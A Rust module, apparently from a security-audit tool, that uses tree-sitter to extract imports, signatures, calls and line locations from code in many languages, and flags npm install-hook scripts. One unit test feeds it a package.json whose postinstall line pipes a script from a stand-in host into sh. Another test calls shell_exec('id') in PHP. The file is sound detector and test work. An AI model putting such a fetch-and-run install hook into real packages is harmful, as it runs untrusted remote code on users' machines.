use std::path::Path;

use serde::Serialize;
use tree_sitter::{Node, Parser};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
pub enum Lang {
    Rust,
    Python,
    Go,
    JavaScript,
    PackageJson,
    TypeScript,
    Tsx,
    Html,
    Css,
    Zig,
    Bash,
    Dart,
    Kotlin,
    Java,
    C,
    Cpp,
    CSharp,
    Php,
    Swift,
    Ruby,
    Sql,
    Dockerfile,
    Yaml,
    Hcl,
    Vue,
    Svelte,
}

impl Lang {
    pub fn from_path(p: &Path) -> Option<Lang> {
        match p.file_name().and_then(|n| n.to_str()) {
            Some("Dockerfile" | "Containerfile") => return Some(Lang::Dockerfile),
            Some("Gemfile" | "Rakefile") => return Some(Lang::Ruby),
            Some("package.json") => return Some(Lang::PackageJson),
            _ => {}
        }
        match p.extension().and_then(|e| e.to_str()) {
            Some("rs") => Some(Lang::Rust),
            Some("py") => Some(Lang::Python),
            Some("go") => Some(Lang::Go),
            Some("js" | "cjs" | "mjs" | "jsx") => Some(Lang::JavaScript),
            Some("ts") => Some(Lang::TypeScript),
            Some("tsx") => Some(Lang::Tsx),
            Some("html" | "htm") => Some(Lang::Html),
            Some("css") => Some(Lang::Css),
            Some("zig") => Some(Lang::Zig),
            Some("sh" | "bash" | "zsh") => Some(Lang::Bash),
            Some("dart") => Some(Lang::Dart),
            Some("kt" | "kts") => Some(Lang::Kotlin),
            Some("java") => Some(Lang::Java),
            Some("c" | "h") => Some(Lang::C),
            Some("cc" | "cpp" | "cxx" | "c++" | "hh" | "hpp" | "hxx" | "h++") => Some(Lang::Cpp),
            Some("cs") => Some(Lang::CSharp),
            Some("php") => Some(Lang::Php),
            Some("swift") => Some(Lang::Swift),
            Some("rb" | "rake" | "gemspec") => Some(Lang::Ruby),
            Some("sql") => Some(Lang::Sql),
            Some("dockerfile" | "containerfile") => Some(Lang::Dockerfile),
            Some("yaml" | "yml") => Some(Lang::Yaml),
            Some("hcl" | "tf" | "tfvars") => Some(Lang::Hcl),
            Some("vue") => Some(Lang::Vue),
            Some("svelte") => Some(Lang::Svelte),
            _ => None,
        }
    }
    fn ts(self) -> tree_sitter::Language {
        match self {
            Lang::Rust => tree_sitter_rust::LANGUAGE.into(),
            Lang::Python => tree_sitter_python::LANGUAGE.into(),
            Lang::Go => tree_sitter_go::LANGUAGE.into(),
            Lang::JavaScript => tree_sitter_javascript::LANGUAGE.into(),
            Lang::PackageJson => tree_sitter_javascript::LANGUAGE.into(),
            Lang::TypeScript => tree_sitter_typescript::LANGUAGE_TYPESCRIPT.into(),
            Lang::Tsx => tree_sitter_typescript::LANGUAGE_TSX.into(),
            Lang::Html => tree_sitter_html::LANGUAGE.into(),
            Lang::Css => tree_sitter_css::LANGUAGE.into(),
            Lang::Zig => tree_sitter_zig::LANGUAGE.into(),
            Lang::Bash => tree_sitter_bash::LANGUAGE.into(),
            Lang::Dart => tree_sitter_dart::LANGUAGE.into(),
            Lang::Kotlin => tree_sitter_kotlin_ng::LANGUAGE.into(),
            Lang::Java => tree_sitter_java::LANGUAGE.into(),
            Lang::C => tree_sitter_c::LANGUAGE.into(),
            Lang::Cpp => tree_sitter_cpp::LANGUAGE.into(),
            Lang::CSharp => tree_sitter_c_sharp::LANGUAGE.into(),
            Lang::Php => tree_sitter_php::LANGUAGE_PHP.into(),
            Lang::Swift => tree_sitter_swift::LANGUAGE.into(),
            Lang::Ruby => tree_sitter_ruby::LANGUAGE.into(),
            Lang::Sql => tree_sitter_sequel::LANGUAGE.into(),
            Lang::Dockerfile => tree_sitter_containerfile::LANGUAGE.into(),
            Lang::Yaml => tree_sitter_yaml::LANGUAGE.into(),
            Lang::Hcl => tree_sitter_hcl::LANGUAGE.into(),
            Lang::Vue => tree_sitter_vue_sqry::language(),
            Lang::Svelte => tree_sitter_svelte_next::LANGUAGE.into(),
        }
    }

    fn label(self) -> &'static str {
        match self {
            Lang::Rust => "rust",
            Lang::Python => "python",
            Lang::Go => "go",
            Lang::JavaScript => "javascript",
            Lang::PackageJson => "package-json",
            Lang::TypeScript => "typescript",
            Lang::Tsx => "tsx",
            Lang::Html => "html",
            Lang::Css => "css",
            Lang::Zig => "zig",
            Lang::Bash => "bash",
            Lang::Dart => "dart",
            Lang::Kotlin => "kotlin",
            Lang::Java => "java",
            Lang::C => "c",
            Lang::Cpp => "cpp",
            Lang::CSharp => "csharp",
            Lang::Php => "php",
            Lang::Swift => "swift",
            Lang::Ruby => "ruby",
            Lang::Sql => "sql",
            Lang::Dockerfile => "dockerfile",
            Lang::Yaml => "yaml",
            Lang::Hcl => "hcl",
            Lang::Vue => "vue",
            Lang::Svelte => "svelte",
        }
    }
}

/// Flat dehydrated structure: topology only, no comments or function bodies.
#[derive(Debug, Default, Serialize)]
pub struct AstSummary {
    pub path: String,
    pub lang: Option<&'static str>,
    pub imports: Vec<String>,
    pub signatures: Vec<String>,
    pub calls: Vec<String>,
    /// Line-aware structure index for the P4 risk ledger.
    pub locations: Vec<AstLocation>,
    /// References crossing the current audit boundary.
    pub external: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct AstLocation {
    pub kind: &'static str,
    pub line: usize,
    pub text: String,
}

/// Parse failures return None or partial summaries; ASTs are dropped after extraction.
pub fn dehydrate(path: &Path, src: &[u8]) -> Option<AstSummary> {
    let lang = Lang::from_path(path)?;
    if lang == Lang::PackageJson {
        return Some(dehydrate_package_json(path, src));
    }
    let mut parser = Parser::new();
    if parser.set_language(&lang.ts()).is_err() {
        return None;
    }
    let tree = parser.parse(src, None)?;
    let mut sum = AstSummary {
        path: path.display().to_string(),
        ..Default::default()
    };
    sum.lang = Some(lang.label());
    walk(tree.root_node(), src, lang, &mut sum);
    dedup(&mut sum.imports);
    dedup(&mut sum.signatures);
    dedup(&mut sum.calls);
    sum.locations
        .sort_by(|a, b| (a.line, a.kind, &a.text).cmp(&(b.line, b.kind, &b.text)));
    sum.locations.dedup();
    dedup(&mut sum.external);
    Some(sum)
}

fn dehydrate_package_json(path: &Path, src: &[u8]) -> AstSummary {
    let mut sum = AstSummary {
        path: path.display().to_string(),
        lang: Some(Lang::PackageJson.label()),
        ..Default::default()
    };
    let text = String::from_utf8_lossy(src);
    for (idx, line) in text.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.starts_with("\"scripts\"") {
            sum.signatures.push(trimmed.chars().take(140).collect());
            sum.locations.push(AstLocation {
                kind: "signature",
                line: idx + 1,
                text: trimmed.chars().take(140).collect(),
            });
            continue;
        }
        if is_npm_lifecycle_script_line(trimmed) {
            let text: String = trimmed.chars().take(140).collect();
            sum.calls.push(text.clone());
            sum.locations.push(AstLocation {
                kind: "call",
                line: idx + 1,
                text,
            });
        }
    }
    dedup(&mut sum.signatures);
    dedup(&mut sum.calls);
    sum
}

fn is_npm_lifecycle_script_line(line: &str) -> bool {
    [
        "preinstall",
        "install",
        "postinstall",
        "prepare",
        "prepack",
        "postpack",
    ]
    .iter()
    .any(|key| line.contains(&format!("\"{key}\"")) && line.contains(':'))
}

fn first_line(node: Node, src: &[u8]) -> Option<String> {
    let text = node.utf8_text(src).ok()?;
    let line = text.lines().next().unwrap_or("").trim();
    if line.is_empty() {
        None
    } else {
        Some(line.chars().take(140).collect())
    }
}

fn push_location(sum: &mut AstSummary, kind: &'static str, node: Node, text: &str) {
    sum.locations.push(AstLocation {
        kind,
        line: node.start_position().row + 1,
        text: text.to_string(),
    });
}

fn is_external(import: &str) -> bool {
    import.contains("super::")
        || import.contains("crate::")
        || import.trim_start().starts_with("from .")
        || import.trim_start().starts_with("import ")
        || import.trim_start().starts_with("@import")
        || import.trim_start().starts_with("source ")
        || import.trim_start().starts_with(". ")
        || import.trim_start().starts_with("package ")
        || import.trim_start().starts_with("require ")
        || import.trim_start().starts_with("require(")
        || import.trim_start().starts_with("include ")
}

fn walk(root: Node, src: &[u8], lang: Lang, sum: &mut AstSummary) {
    let mut cursor = root.walk();
    let mut stack = vec![root];
    while let Some(node) = stack.pop() {
        if is_import_node(lang, node.kind()) {
            if let Some(l) = first_line(node, src) {
                if is_external(&l) {
                    sum.external.push(format!("[EXTERNAL_BLACKBOX] {l}"));
                }
                push_location(sum, "import", node, &l);
                sum.imports.push(l);
            }
        } else if is_signature_node(lang, node.kind()) {
            if let Some(l) = first_line(node, src) {
                push_location(sum, "signature", node, &l);
                sum.signatures.push(l);
            }
        } else if is_call_node(lang, node.kind())
            && let Some(f) = call_text(node, src, lang)
        {
            push_location(sum, "call", node, &f);
            sum.calls.push(f);
        }
        for child in node.children(&mut cursor) {
            stack.push(child);
        }
    }
}

fn is_import_node(lang: Lang, kind: &str) -> bool {
    match lang {
        Lang::Rust => kind == "use_declaration",
        Lang::Python => matches!(kind, "import_statement" | "import_from_statement"),
        Lang::Go => kind == "import_declaration",
        Lang::JavaScript | Lang::PackageJson | Lang::TypeScript | Lang::Tsx => {
            matches!(kind, "import_statement" | "export_statement")
        }
        Lang::Dart => matches!(
            kind,
            "import_or_export" | "library_import" | "import_statement" | "export_statement"
        ),
        Lang::Kotlin => matches!(
            kind,
            "import" | "import_statement" | "export_statement" | "package_header"
        ),
        Lang::Java => matches!(
            kind,
            "import_declaration" | "import_statement" | "export_statement" | "package_header"
        ),
        Lang::Swift => {
            matches!(kind, "import" | "import_declaration" | "import_statement")
        }
        Lang::C | Lang::Cpp => matches!(kind, "preproc_include" | "preproc_def"),
        Lang::CSharp => matches!(kind, "using_directive" | "extern_alias_directive"),
        Lang::Php => matches!(kind, "namespace_use_declaration" | "require_expression"),
        Lang::Css => kind == "import_statement",
        Lang::Bash => kind == "source_command",
        Lang::Dockerfile => kind == "from_instruction",
        Lang::Sql
        | Lang::Yaml
        | Lang::Hcl
        | Lang::Vue
        | Lang::Svelte
        | Lang::Html
        | Lang::Zig
        | Lang::Ruby => false,
    }
}

fn is_signature_node(lang: Lang, kind: &str) -> bool {
    match lang {
        Lang::Rust => matches!(
            kind,
            "function_item" | "struct_item" | "enum_item" | "trait_item" | "impl_item"
        ),
        Lang::Python => matches!(kind, "function_definition" | "class_definition"),
        Lang::Go => matches!(
            kind,
            "function_declaration" | "method_declaration" | "type_declaration"
        ),
        Lang::JavaScript | Lang::PackageJson | Lang::TypeScript | Lang::Tsx => matches!(
            kind,
            "function_declaration"
                | "generator_function_declaration"
                | "class_declaration"
                | "method_definition"
        ),
        Lang::Dart => matches!(
            kind,
            "class_declaration"
                | "class_definition"
                | "function_declaration"
                | "mixin_declaration"
                | "extension_declaration"
                | "function_signature"
                | "function_body"
                | "method_signature"
        ),
        Lang::Kotlin => matches!(
            kind,
            "class_declaration"
                | "object_declaration"
                | "function_declaration"
                | "property_declaration"
                | "interface_declaration"
        ),
        Lang::Java => matches!(
            kind,
            "class_declaration"
                | "interface_declaration"
                | "enum_declaration"
                | "record_declaration"
                | "method_declaration"
                | "constructor_declaration"
        ),
        Lang::C | Lang::Cpp => matches!(
            kind,
            "function_definition"
                | "declaration"
                | "struct_specifier"
                | "class_specifier"
                | "enum_specifier"
                | "namespace_definition"
        ),
        Lang::CSharp => matches!(
            kind,
            "class_declaration"
                | "interface_declaration"
                | "enum_declaration"
                | "record_declaration"
                | "struct_declaration"
                | "method_declaration"
                | "constructor_declaration"
        ),
        Lang::Php => matches!(
            kind,
            "function_definition"
                | "method_declaration"
                | "class_declaration"
                | "interface_declaration"
                | "trait_declaration"
        ),
        Lang::Swift => matches!(
            kind,
            "class_declaration"
                | "struct_declaration"
                | "protocol_declaration"
                | "enum_declaration"
                | "function_declaration"
        ),
        Lang::Ruby => matches!(
            kind,
            "method" | "singleton_method" | "class" | "module" | "do_block" | "block"
        ),
        Lang::Html => matches!(kind, "element" | "script_element" | "style_element"),
        Lang::Css => matches!(kind, "rule_set" | "at_rule"),
        Lang::Zig => matches!(kind, "function_declaration" | "variable_declaration"),
        Lang::Bash => kind == "function_definition",
        Lang::Sql => matches!(
            kind,
            "select_statement"
                | "insert_statement"
                | "update_statement"
                | "delete_statement"
                | "create_statement"
                | "drop_statement"
                | "alter_statement"
                | "statement"
        ),
        Lang::Dockerfile => kind.ends_with("_instruction") && kind != "run_instruction",
        Lang::Yaml => matches!(
            kind,
            "block_mapping_pair" | "block_sequence_item" | "flow_pair"
        ),
        Lang::Hcl => matches!(kind, "block" | "attribute"),
        Lang::Vue | Lang::Svelte => matches!(
            kind,
            "element"
                | "script_element"
                | "style_element"
                | "template_element"
                | "component"
                | "start_tag"
        ),
    }
}

fn is_call_node(lang: Lang, kind: &str) -> bool {
    match lang {
        Lang::Rust | Lang::Go => kind == "call_expression",
        Lang::Zig => matches!(kind, "call_expression" | "builtin_function"),
        Lang::Python => kind == "call",
        Lang::JavaScript | Lang::PackageJson | Lang::TypeScript | Lang::Tsx => {
            matches!(kind, "call_expression" | "new_expression")
        }
        Lang::Dart
        | Lang::Kotlin
        | Lang::Java
        | Lang::C
        | Lang::Cpp
        | Lang::CSharp
        | Lang::Php
        | Lang::Swift => matches!(
            kind,
            "call_expression"
                | "method_invocation"
                | "object_creation_expression"
                | "creation_expression"
                | "invocation_expression"
                | "function_call_expression"
                | "member_call_expression"
                | "nullsafe_member_call_expression"
                | "scoped_call_expression"
        ),
        Lang::Ruby => matches!(kind, "call" | "command" | "command_call"),
        Lang::Css => kind == "call_expression",
        Lang::Bash => matches!(kind, "command" | "command_substitution"),
        Lang::Sql => matches!(
            kind,
            "function_call" | "call_statement" | "execute_statement" | "invocation"
        ),
        Lang::Dockerfile => matches!(
            kind,
            "run_instruction" | "cmd_instruction" | "entrypoint_instruction" | "shell_instruction"
        ),
        Lang::Yaml | Lang::Hcl | Lang::Vue | Lang::Svelte | Lang::Html => false,
    }
}

fn call_text(node: Node, src: &[u8], lang: Lang) -> Option<String> {
    if matches!(lang, Lang::Bash | Lang::Ruby | Lang::Dockerfile | Lang::Sql) {
        return first_line(node, src);
    }
    node.child_by_field_name("function")
        .or_else(|| node.child_by_field_name("constructor"))
        .or_else(|| node.child_by_field_name("name"))
        .or_else(|| node.child(0))
        .and_then(|c| first_line(c, src))
}

fn dedup(v: &mut Vec<String>) {
    v.sort();
    v.dedup();
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn rust_extracts_sig_import_call() {
        let s = b"use std::fs;\npub fn run(x: i32) -> i32 { read(x) }\nstruct P;";
        let r = dehydrate(&PathBuf::from("a.rs"), s).unwrap_or_default();
        assert_eq!(r.lang, Some("rust"));
        assert!(r.imports.iter().any(|i| i.contains("std::fs")));
        assert!(r.signatures.iter().any(|i| i.contains("fn run")));
        assert!(r.calls.iter().any(|c| c.contains("read")));
        assert!(
            r.locations
                .iter()
                .any(|l| l.line == 2 && l.text.contains("read"))
        );
    }

    #[test]
    fn python_extracts_def_and_external() {
        let s = b"from . import sib\nimport os\ndef f(a):\n  return g(a)\nclass C: pass";
        let r = dehydrate(&PathBuf::from("a.py"), s).unwrap_or_default();
        assert!(r.signatures.iter().any(|i| i.contains("def f")));
        assert!(r.signatures.iter().any(|i| i.contains("class C")));
        assert!(!r.external.is_empty());
    }

    #[test]
    fn go_extracts_import_signature_and_call() {
        let s = br#"package main

import "fmt"

type User struct { Name string }

func run(name string) {
    fmt.Println(name)
}
"#;
        let r = dehydrate(&PathBuf::from("a.go"), s).unwrap_or_default();
        assert_eq!(r.lang, Some("go"));
        assert!(r.imports.iter().any(|i| i.contains("fmt")));
        assert!(r.signatures.iter().any(|i| i.contains("func run")));
        assert!(r.signatures.iter().any(|i| i.contains("type User")));
        assert!(r.calls.iter().any(|c| c.contains("fmt.Println")));
    }

    #[test]
    fn javascript_extracts_import_signature_and_call() {
        let s = br#"import thing from "./thing.js";

class Worker {
  run() {
    thing();
  }
}

function main() {
  fetch("/api");
}
"#;
        let r = dehydrate(&PathBuf::from("a.js"), s).unwrap_or_default();
        assert_eq!(r.lang, Some("javascript"));
        assert!(r.imports.iter().any(|i| i.contains("thing.js")));
        assert!(r.signatures.iter().any(|i| i.contains("class Worker")));
        assert!(r.signatures.iter().any(|i| i.contains("function main")));
        assert!(r.calls.iter().any(|c| c.contains("fetch")));
        assert!(r.calls.iter().any(|c| c.contains("thing")));
    }

    #[test]
    fn package_json_extracts_lifecycle_scripts() {
        let s = br#"{
  "scripts": {
    "test": "node test.js",
    "postinstall": "curl https://example.invalid/install.sh | sh"
  }
}
"#;
        let r = dehydrate(&PathBuf::from("package.json"), s).unwrap_or_default();
        assert_eq!(r.lang, Some("package-json"));
        assert!(r.signatures.iter().any(|i| i.contains("\"scripts\"")));
        assert!(r.calls.iter().any(|c| c.contains("postinstall")));
        assert!(
            r.locations
                .iter()
                .any(|l| l.line == 4 && l.text.contains("postinstall"))
        );
        assert!(!r.calls.iter().any(|c| c.contains("\"test\"")));
    }

    #[test]
    fn typescript_and_tsx_extract_symbols() {
        let ts = br#"import { client } from "./client";

type User = { name: string };

export function loadUser(id: string): Promise<User> {
  return client.get(id);
}
"#;
        let r = dehydrate(&PathBuf::from("a.ts"), ts).unwrap_or_default();
        assert_eq!(r.lang, Some("typescript"));
        assert!(r.imports.iter().any(|i| i.contains("./client")));
        assert!(r.signatures.iter().any(|i| i.contains("function loadUser")));
        assert!(r.calls.iter().any(|c| c.contains("client.get")));

        let tsx = br#"export function View() {
  return <button onClick={() => save()}>Save</button>;
}
"#;
        let r = dehydrate(&PathBuf::from("a.tsx"), tsx).unwrap_or_default();
        assert_eq!(r.lang, Some("tsx"));
        assert!(r.signatures.iter().any(|i| i.contains("function View")));
        assert!(r.calls.iter().any(|c| c.contains("save")));
    }

    #[test]
    fn html_and_css_extract_structure() {
        let html = br#"<main>
  <script type="module">run()</script>
  <style>.btn { color: red; }</style>
</main>
"#;
        let r = dehydrate(&PathBuf::from("index.html"), html).unwrap_or_default();
        assert_eq!(r.lang, Some("html"));
        assert!(r.signatures.iter().any(|i| i.contains("<main>")));
        assert!(r.signatures.iter().any(|i| i.contains("<script")));
        assert!(r.signatures.iter().any(|i| i.contains("<style")));

        let css = br#"@import "./base.css";
.btn { color: var(--accent); }
"#;
        let r = dehydrate(&PathBuf::from("style.css"), css).unwrap_or_default();
        assert_eq!(r.lang, Some("css"));
        assert!(r.imports.iter().any(|i| i.contains("@import")));
        assert!(r.signatures.iter().any(|i| i.contains(".btn")));
        assert!(r.calls.iter().any(|c| c.contains("var")));
    }

    #[test]
    fn zig_and_bash_extract_symbols() {
        let zig = br#"const std = @import("std");

pub fn main() void {
    std.debug.print("hi", .{});
}
"#;
        let r = dehydrate(&PathBuf::from("main.zig"), zig).unwrap_or_default();
        assert_eq!(r.lang, Some("zig"));
        assert!(r.signatures.iter().any(|i| i.contains("pub fn main")));
        assert!(r.signatures.iter().any(|i| i.contains("const std")));
        assert!(r.calls.iter().any(|c| c.contains("@import")));
        assert!(r.calls.iter().any(|c| c.contains("std.debug.print")));

        let bash = br#"source ./env.sh
run() {
  curl "$URL"
}
run
"#;
        let r = dehydrate(&PathBuf::from("setup.sh"), bash).unwrap_or_default();
        assert_eq!(r.lang, Some("bash"));
        assert!(r.signatures.iter().any(|i| i.contains("run()")));
        assert!(r.calls.iter().any(|c| c.contains("curl")));
        assert!(r.calls.iter().any(|c| c.contains("run")));
    }

    #[test]
    fn dart_kotlin_java_extract_symbols() {
        let dart = br#"import 'package:flutter/material.dart';

class Home extends StatelessWidget {
  Widget build(BuildContext context) {
    return Text('hi');
  }
}
"#;
        let r = dehydrate(&PathBuf::from("main.dart"), dart).unwrap_or_default();
        assert_eq!(r.lang, Some("dart"));
        assert!(r.imports.iter().any(|i| i.contains("flutter")));
        assert!(r.signatures.iter().any(|i| i.contains("class Home")));
        assert!(r.calls.iter().any(|c| c.contains("Text")));

        let kotlin = br#"package demo
import java.io.File

class App {
  fun run() {
    File("x").readText()
  }
}
"#;
        let r = dehydrate(&PathBuf::from("App.kt"), kotlin).unwrap_or_default();
        assert_eq!(r.lang, Some("kotlin"));
        assert!(r.imports.iter().any(|i| i.contains("java.io.File")));
        assert!(r.signatures.iter().any(|i| i.contains("class App")));
        assert!(r.signatures.iter().any(|i| i.contains("fun run")));
        assert!(r.calls.iter().any(|c| c.contains("File")));

        let java = br#"import java.io.File;

class App {
  void run() {
    System.out.println(new File("x"));
  }
}
"#;
        let r = dehydrate(&PathBuf::from("App.java"), java).unwrap_or_default();
        assert_eq!(r.lang, Some("java"));
        assert!(r.imports.iter().any(|i| i.contains("java.io.File")));
        assert!(r.signatures.iter().any(|i| i.contains("class App")));
        assert!(r.signatures.iter().any(|i| i.contains("void run")));
        assert!(r.calls.iter().any(|c| c.contains("println")));
    }

    #[test]
    fn c_cpp_csharp_extract_symbols() {
        let c = br#"#include <stdio.h>

int main(void) {
  printf("hi");
}
"#;
        let r = dehydrate(&PathBuf::from("main.c"), c).unwrap_or_default();
        assert_eq!(r.lang, Some("c"));
        assert!(r.imports.iter().any(|i| i.contains("stdio.h")));
        assert!(r.signatures.iter().any(|i| i.contains("int main")));
        assert!(r.calls.iter().any(|i| i.contains("printf")));

        let cpp = br#"#include <vector>

class App {};
int main() {
  App app;
}
"#;
        let r = dehydrate(&PathBuf::from("main.cpp"), cpp).unwrap_or_default();
        assert_eq!(r.lang, Some("cpp"));
        assert!(r.imports.iter().any(|i| i.contains("vector")));
        assert!(r.signatures.iter().any(|i| i.contains("class App")));
        assert!(r.signatures.iter().any(|i| i.contains("int main")));

        let csharp = br#"using System;

class App {
  void Run() {
    Console.WriteLine("hi");
  }
}
"#;
        let r = dehydrate(&PathBuf::from("App.cs"), csharp).unwrap_or_default();
        assert_eq!(r.lang, Some("csharp"));
        assert!(r.imports.iter().any(|i| i.contains("using System")));
        assert!(r.signatures.iter().any(|i| i.contains("class App")));
        assert!(r.signatures.iter().any(|i| i.contains("void Run")));
        assert!(r.calls.iter().any(|i| i.contains("Console.WriteLine")));
    }

    #[test]
    fn php_swift_ruby_extract_symbols() {
        let php = br#"<?php
require 'vendor/autoload.php';

class App {
  function run() {
    shell_exec('id');
  }
}
"#;
        let r = dehydrate(&PathBuf::from("index.php"), php).unwrap_or_default();
        assert_eq!(r.lang, Some("php"));
        assert!(r.imports.iter().any(|i| i.contains("require")));
        assert!(r.signatures.iter().any(|i| i.contains("class App")));
        assert!(r.signatures.iter().any(|i| i.contains("function run")));
        assert!(r.calls.iter().any(|i| i.contains("shell_exec")));

        let swift = br#"import Foundation

struct App {
  func run() {
    print("hi")
  }
}
"#;
        let r = dehydrate(&PathBuf::from("App.swift"), swift).unwrap_or_default();
        assert_eq!(r.lang, Some("swift"));
        assert!(r.imports.iter().any(|i| i.contains("Foundation")));
        assert!(r.signatures.iter().any(|i| i.contains("struct App")));
        assert!(r.signatures.iter().any(|i| i.contains("func run")));
        assert!(r.calls.iter().any(|i| i.contains("print")));

        let ruby = br#"require "json"

class App
  def run
    puts JSON.parse("{}")
  end
end
"#;
        let r = dehydrate(&PathBuf::from("app.rb"), ruby).unwrap_or_default();
        assert_eq!(r.lang, Some("ruby"));
        assert!(r.signatures.iter().any(|i| i.contains("class App")));
        assert!(r.signatures.iter().any(|i| i.contains("def run")));
        assert!(r.calls.iter().any(|i| i.contains("JSON.parse")));
    }

    #[test]
    fn sql_docker_yaml_hcl_vue_svelte_extract_structure() {
        let sql = br#"CREATE TABLE users(id int);
SELECT count(*) FROM users;
"#;
        let r = dehydrate(&PathBuf::from("schema.sql"), sql).unwrap_or_default();
        assert_eq!(r.lang, Some("sql"));
        assert!(r.signatures.iter().any(|i| i.contains("CREATE TABLE")));
        assert!(r.calls.iter().any(|i| i.contains("count")));

        let dockerfile = br#"FROM alpine:3.20
RUN apk add --no-cache curl
COPY . /app
"#;
        let r = dehydrate(&PathBuf::from("Dockerfile"), dockerfile).unwrap_or_default();
        assert_eq!(r.lang, Some("dockerfile"));
        assert!(r.imports.iter().any(|i| i.contains("FROM alpine")));
        assert!(r.calls.iter().any(|i| i.contains("RUN apk")));

        let yaml = br#"services:
  api:
    image: app:latest
"#;
        let r = dehydrate(&PathBuf::from("compose.yaml"), yaml).unwrap_or_default();
        assert_eq!(r.lang, Some("yaml"));
        assert!(r.signatures.iter().any(|i| i.contains("services")));

        let hcl = br#"resource "aws_s3_bucket" "logs" {
  bucket = "logs"
}
"#;
        let r = dehydrate(&PathBuf::from("main.tf"), hcl).unwrap_or_default();
        assert_eq!(r.lang, Some("hcl"));
        assert!(r.signatures.iter().any(|i| i.contains("resource")));

        let vue = br#"<template><button @click="save">Save</button></template>
<script>export default { methods: { save() { fetch('/api') } } }</script>
"#;
        let r = dehydrate(&PathBuf::from("App.vue"), vue).unwrap_or_default();
        assert_eq!(r.lang, Some("vue"));
        assert!(r.signatures.iter().any(|i| i.contains("template")));

        let svelte = br#"<script>
  function save() { fetch('/api'); }
</script>
<button on:click={save}>Save</button>
"#;
        let r = dehydrate(&PathBuf::from("App.svelte"), svelte).unwrap_or_default();
        assert_eq!(r.lang, Some("svelte"));
        assert!(r.signatures.iter().any(|i| i.contains("script")));
    }

    #[test]
    fn broken_input_no_panic() {
        let r = dehydrate(&PathBuf::from("a.rs"), b"fn ( { ] unterminated").unwrap_or_default();
        assert_eq!(r.lang, Some("rust"));
    }

    #[test]
    fn unknown_ext_is_none() {
        assert!(dehydrate(&PathBuf::from("a.txt"), b"hi").is_none());
    }
}
